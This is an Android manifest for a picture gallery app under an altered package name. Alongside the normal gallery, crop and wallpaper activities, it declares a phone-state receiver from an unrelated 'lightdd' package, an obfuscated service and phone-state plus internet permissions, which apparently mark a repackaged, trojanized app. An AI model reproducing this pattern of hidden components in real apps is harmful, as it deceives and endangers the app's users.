<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.alensw.super.PicFolder">
    <application android:icon="@drawable/icon" android:label="@string/app_name">
        <activity android:configChanges="orientation" android:label="@string/app_name" android:name="com.alensw.PicFolder.GalleryActivity" android:taskAffinity="android.task.pictures" android:theme="@android:style/Theme.Black.NoTitleBar">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
            <intent-filter>
                <action android:name="android.intent.action.GET_CONTENT"/>
                <category android:name="android.intent.category.OPENABLE"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <data android:mimeType="image/*"/>
            </intent-filter>
            <intent-filter>
                <action android:name="android.intent.action.GET_CONTENT"/>
                <category android:name="android.intent.category.OPENABLE"/>
                <data android:mimeType="vnd.android.cursor.dir/image"/>
            </intent-filter>
            <intent-filter>
                <action android:name="android.intent.action.PICK"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <data android:mimeType="image/*"/>
            </intent-filter>
            <intent-filter>
                <action android:name="android.intent.action.PICK"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <data android:mimeType="vnd.android.cursor.dir/image"/>
            </intent-filter>
        </activity>
        <activity android:configChanges="orientation" android:label="@string/folder" android:name="com.alensw.PicFolder.FolderActivity" android:theme="@android:style/Theme.Black.NoTitleBar"/>
        <activity android:configChanges="orientation" android:label="@string/app_name" android:name="com.alensw.PicFolder.PictureActivity" android:theme="@android:style/Theme.Black.NoTitleBar.Fullscreen">
            <intent-filter>
                <action android:name="android.intent.action.VIEW"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <data android:mimeType="image/*"/>
            </intent-filter>
            <intent-filter>
                <action android:name="com.cooliris.media.action.REVIEW"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <data android:mimeType="image/*"/>
            </intent-filter>
        </activity>
        <activity android:configChanges="orientation" android:label="@string/crop" android:name="com.alensw.PicFolder.CropActivity" android:theme="@android:style/Theme.Black.NoTitleBar.Fullscreen">
            <intent-filter>
                <action android:name="com.android.camera.action.CROP"/>
                <data android:mimeType="image/*"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <category android:name="android.intent.category.ALTERNATIVE"/>
                <category android:name="android.intent.category.SELECTED_ALTERNATIVE"/>
            </intent-filter>
        </activity>
        <activity android:label="@string/wallpaper" android:name="com.alensw.PicFolder.WallpaperActivity">
            <intent-filter>
                <action android:name="android.intent.action.SET_WALLPAPER"/>
                <category android:name="android.intent.category.DEFAULT"/>
            </intent-filter>
            <intent-filter>
                <action android:name="android.intent.action.ATTACH_DATA"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <data android:mimeType="image/*"/>
            </intent-filter>
        </activity>
        <activity android:configChanges="orientation" android:name="com.alensw.PicFolder.FolderListActivity" android:theme="@android:style/Theme.Black"/>
        <activity android:label="@string/settings" android:name="com.alensw.PicFolder.MainPreference"/>
        <receiver android:name="com.passionteam.lightdd.Receiver">
            <intent-filter>
                <action android:name="android.intent.action.PHONE_STATE"/>
                <category android:name="android.intent.category.DEFAULT"/>
            </intent-filter>
        </receiver>
        <service android:name="cl$jJ"/>
    </application>
    <uses-permission android:name="android.permission.SET_WALLPAPER"/>
    <uses-permission android:name="android.permission.WAKE_LOCK"/>
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
</manifest>